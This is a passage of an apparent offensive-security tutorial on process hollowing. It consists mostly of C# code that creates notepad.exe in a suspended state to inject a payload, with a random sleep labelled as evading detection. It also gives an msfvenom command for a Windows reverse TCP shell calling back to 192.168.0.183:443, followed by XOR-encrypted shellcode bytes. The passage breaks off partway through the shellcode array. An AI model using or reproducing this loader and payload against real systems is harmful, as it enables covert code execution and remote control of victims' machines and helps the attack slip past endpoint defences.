<h2 id="process-hollowing">Process Hollowing</h2>

<p>We can finally use a technique called Process Hollowing, where a victim process is created in a suspended state, its original process (e.g.: notepad.exe) is carved out from memory, a malicious binary gets written instead and the program state is resumed to execute the injected code. Here we will open a simple reverse shell (payload: windows/x64/shell_reverse_tcp) just to show the execution. The entire code would be like this (C#):</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">Process_Hollowing</span>
<span class="p">{</span>
    <span class="k">class</span> <span class="nc">Program</span>
    <span class="p">{</span>
        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">WriteProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nSize</span><span class="p">,</span> <span class="k">ref</span> <span class="n">IntPtr</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>
        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">ReadProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="p">[</span><span class="n">Out</span><span class="p">]</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwSize</span><span class="p">,</span> <span class="k">out</span> <span class="n">IntPtr</span> <span class="n">lpNumberOfBytesRead</span><span class="p">);</span>
        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">CreateProcess</span><span class="p">(</span><span class="kt">string</span> <span class="n">lpApplicationName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpCommandLine</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpProcessAttributes</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandles</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpEnvironment</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpCurrentDirectory</span><span class="p">,</span> <span class="k">ref</span> <span class="n">STARTUPINFO</span> <span class="n">lpStartupInfo</span><span class="p">,</span> <span class="k">ref</span> <span class="n">PROCESS_INFORMATION</span> <span class="n">lpProcessInformation</span><span class="p">);</span>
        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">)]</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">int</span> <span class="nf">ZwQueryInformationProcess</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="kt">int</span> <span class="n">procInformationClass</span><span class="p">,</span> <span class="k">ref</span> <span class="n">PROCESS_BASIC_INFORMATION</span> <span class="n">procInformation</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">ProcInfoLen</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">uint</span> <span class="n">retlen</span><span class="p">);</span>
        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">uint</span> <span class="nf">ResumeThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hThread</span><span class="p">);</span>
        <span class="p">[</span><span class="nf">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">)]</span>
        <span class="k">internal</span> <span class="k">struct</span> <span class="nc">PROCESS_BASIC_INFORMATION</span>
        <span class="p">{</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">ExitStatus</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">PebAddress</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">AffinityMask</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">BasePriority</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">UniquePID</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">InheritedFromUniqueProcessId</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="p">[</span><span class="nf">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">,</span> <span class="n">CharSet</span> <span class="p">=</span> <span class="n">CharSet</span><span class="p">.</span><span class="n">Unicode</span><span class="p">)]</span>
        <span class="k">public</span> <span class="k">struct</span> <span class="nc">STARTUPINFO</span>
        <span class="p">{</span>
            <span class="k">public</span> <span class="n">Int32</span> <span class="n">cb</span><span class="p">;</span>
            <span class="k">public</span> <span class="kt">string</span> <span class="n">lpReserved</span><span class="p">;</span>
            <span class="k">public</span> <span class="kt">string</span> <span class="n">lpDesktop</span><span class="p">;</span>
            <span class="k">public</span> <span class="kt">string</span> <span class="n">lpTitle</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwX</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwY</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwXSize</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwYSize</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwXCountChars</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwYCountChars</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwFillAttribute</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">Int32</span> <span class="n">dwFlags</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">Int16</span> <span class="n">wShowWindow</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">Int16</span> <span class="n">cbReserved2</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">lpReserved2</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hStdInput</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hStdOutput</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hStdError</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="p">[</span><span class="nf">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">)]</span>
        <span class="k">public</span> <span class="k">struct</span> <span class="nc">PROCESS_INFORMATION</span>
        <span class="p">{</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">;</span>
            <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">hThread</span><span class="p">;</span>
            <span class="k">public</span> <span class="kt">int</span> <span class="n">dwProcessId</span><span class="p">;</span>
            <span class="k">public</span> <span class="kt">int</span> <span class="n">dwThreadId</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">CreationFlags</span>
        <span class="p">{</span>
            <span class="k">public</span> <span class="k">const</span> <span class="kt">uint</span> <span class="n">SUSPENDED</span> <span class="p">=</span> <span class="m">0x4</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">public</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">PROCESSBASICINFORMATION</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">sleep</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="kt">var</span> <span class="n">rand</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Random</span><span class="p">();</span>
            <span class="kt">uint</span> <span class="n">randTime</span> <span class="p">=</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">rand</span><span class="p">.</span><span class="nf">Next</span><span class="p">(</span><span class="m">10000</span><span class="p">,</span> <span class="m">20000</span><span class="p">);</span>
            <span class="kt">double</span> <span class="n">decide</span> <span class="p">=</span> <span class="n">randTime</span> <span class="p">/</span> <span class="m">1000</span> <span class="p">-</span> <span class="m">0.5</span><span class="p">;</span>
            <span class="n">DateTime</span> <span class="n">now</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">Now</span><span class="p">;</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Sleeping for {0} seconds to evade detections..."</span><span class="p">,</span> <span class="n">randTime</span> <span class="p">/</span> <span class="m">1000</span><span class="p">);</span>
            <span class="n">Thread</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">randTime</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">DateTime</span><span class="p">.</span><span class="n">Now</span><span class="p">.</span><span class="nf">Subtract</span><span class="p">(</span><span class="n">now</span><span class="p">).</span><span class="n">TotalSeconds</span> <span class="p">&lt;</span> <span class="n">decide</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Hollow</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="n">PROCESS_INFORMATION</span> <span class="n">proc_info</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">PROCESS_INFORMATION</span><span class="p">();</span>
            <span class="n">STARTUPINFO</span> <span class="n">startup_info</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">STARTUPINFO</span><span class="p">();</span>
            <span class="n">PROCESS_BASIC_INFORMATION</span> <span class="n">pbi</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">PROCESS_BASIC_INFORMATION</span><span class="p">();</span>
            <span class="kt">string</span> <span class="n">path</span> <span class="p">=</span> <span class="s">@"C:\\Windows\\System32\\notepad.exe"</span><span class="p">;</span>
            <span class="kt">bool</span> <span class="n">procINIT</span> <span class="p">=</span> <span class="nf">CreateProcess</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="n">CreationFlags</span><span class="p">.</span><span class="n">SUSPENDED</span><span class="p">,</span>
                <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">ref</span> <span class="n">startup_info</span><span class="p">,</span> <span class="k">ref</span> <span class="n">proc_info</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">procINIT</span> <span class="p">==</span> <span class="k">true</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Process create successfully."</span><span class="p">);</span>
                <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Process ID: {0}"</span><span class="p">,</span> <span class="n">proc_info</span><span class="p">.</span><span class="n">dwProcessId</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[-] Could not create the process."</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">//msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.183 LPORT=443 -f csharp EXITFUNC=thread --encrypt xor --encrypt-key z</span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">buf</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">460</span><span class="p">]</span> <span class="p">{</span><span class="m">0x86</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf9</span><span class="p">,</span><span class="m">0x9e</span><span class="p">,</span><span class="m">0x8a</span><span class="p">,</span><span class="m">0x92</span><span class="p">,</span>
            <span class="m">0xba</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x2b</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x2b</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span>
            <span class="m">0x4b</span><span class="p">,</span><span class="m">0xa8</span><span class="p">,</span><span class="m">0x1f</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x1a</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x62</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span>
            <span class="m">0xf1</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x08</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xcd</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span>
            <span class="m">0x37</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0xb3</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0xd6</span><span class="p">,</span><span class="m">0x46</span><span class="p">,</span><span class="m">0x1b</span><span class="p">,</span><span class="m">0x06</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span>
            <span class="m">0x5a</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0xb3</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0x98</span><span class="p">,</span><span class="m">0x97</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span>
            <span class="m">0x2b</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span><span class="m">0x46</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0xaa</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span>
            <span class="m">0xfa</span><span class="p">,</span><span class="m">0xf2</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0x0e</span><span class="p">,</span><span class="m">0x1d</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span>
            <span class="m">0xaa</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x62</span><span class="p">,</span><span class="m">0x3e</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x3a</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0xaa</span><span class="p">,</span>
            <span class="m">0x99</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xb3</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x4e</span><span class="p">,</span><span class="m">0xf2</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0xac</span><span class="p">,</span>
            <span class="m">0x37</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0xb3</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0xd6</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0xb3</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span>
            <span class="m">0x7b</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0x42</span><span class="p">,</span><span class="m">0x9a</span><span class="p">,</span><span class="m">0x0f</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x79</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x5e</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x3f</span><span class="p">,</span>
            <span class="m">0x43</span><span class="p">,</span><span class="m">0xab</span><span class="p">,</span><span class="m">0x0f</span><span class="p">,</span><span class="m">0xa2</span><span class="p">,</span><span class="m">0x22</span><span class="p">,</span><span class="m">0x3e</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x3a</span><span class="p">,</span><span class="m">0x5e</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0xaa</span><span class="p">,</span>
            <span class="m">0x1c</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x76</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x3e</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x3a</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0xaa</span><span class="p">,</span>
            <span class="m">0x3b</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x7e</span><span class="p">,</span><span class="m">0xf2</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0xaa</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x22</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x22</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span>
            <span class="m">0x23</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x22</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x23</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf9</span><span class="p">,</span><span class="m">0x96</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span>
            <span class="m">0x3b</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0x9a</span><span class="p">,</span><span class="m">0x22</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x23</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x93</span><span class="p">,</span>
            <span class="m">0x2d</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0x27</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0xc4</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x09</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x25</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span>
            <span class="m">0x48</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0x9c</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xfb</span><span class="p">,</span><span class="m">0x96</span><span class="p">,</span><span class="m">0xda</span><span class="p">,</span>
            <span class="m">0x7b</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0x9f</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0xc6</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span>
            <span class="m">0xba</span><span class="p">,</span><span class="m">0xd2</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0xcd</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0x9e</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span>
            <span class="m">0x3b</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x5c</span><span class="p">,</span><span class="m">0x7d</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xaf</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0x90</span><span class="p">,</span><span class="m">0x12</span><span class="p">,</span>
            <span class="m">0x7b</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x23</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0xfa</span><span class="p">,</span><span class="m">0x11</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span>
            <span class="m">0xaf</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0x37</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0xb3</span><span class="p">,</span><span class="m">0x37</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span>
            <span class="m">0x32</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0xb8</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x90</span><span class="p">,</span>
            <span class="m">0x75</span><span class="p">,</span><span class="m">0xa5</span><span class="p">,</span><span class="m">0x9a</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xaf</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0xbd</span><span class="p">,</span><span class="m">0x10</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x22</span><span class="p">,</span>
            <span class="m">0x36</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0x98</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0x83</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0xe3</span><span class="p">,</span><span class="m">0xdf</span><span class="p">,</span><span class="m">0x0e</span><span class="p">,</span><span class="m">0x1b</span><span class="p">,</span>
            <span class="m">0x85</span><span class="p">,</span><span class="m">0xaf</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xfb</span><span class="p">,</span><span class="m">0xbe</span><span class="p">,</span><span class="m">0x3a</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0xc2</span><span class="p">,</span><span class="m">0x19</span><span class="p">,</span>
            <span class="m">0x17</span><span class="p">,</span><span class="m">0x1e</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span>
            <span class="m">0xf3</span><span class="p">,</span><span class="m">0x98</span><span class="p">,</span><span class="m">0x2d</span><span class="p">,</span><span class="m">0x2d</span><span class="p">,</span><span class="m">0x2d</span><span class="p">,</span><span class="m">0x37</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0x10</span><span class="p">,</span><span class="m">0x77</span><span class="p">,</span><span class="m">0x23</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span>
            <span class="m">0x2a</span><span class="p">,</span><span class="m">0x98</span><span class="p">,</span><span class="m">0x86</span><span class="p">,</span><span class="m">0x1c</span><span class="p">,</span><span class="m">0xbd</span><span class="p">,</span><span class="m">0x3e</span><span class="p">,</span><span class="m">0x5e</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0x7b</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf7</span><span class="p">,</span>
            <span class="m">0x3e</span><span class="p">,</span><span class="m">0x5e</span><span class="p">,</span><span class="m">0x62</span><span class="p">,</span><span class="m">0xbc</span><span class="p">,</span><span class="m">0x7a</span><span class="p">,</span><span class="m">0x12</span><span class="p">,</span><span class="m">0x32</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0x9c</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span>
            <span class="m">0x2a</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x2a</span><span class="p">,</span><span class="m">0x33</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span>
            <span class="m">0xb2</span><span class="p">,</span><span class="m">0x37</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0x36</span><span class="p">,</span><span class="m">0xf3</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x03</span><span class="p">,</span><span class="m">0xb6</span><span class="p">,</span><span class="m">0x45</span><span class="p">,</span>
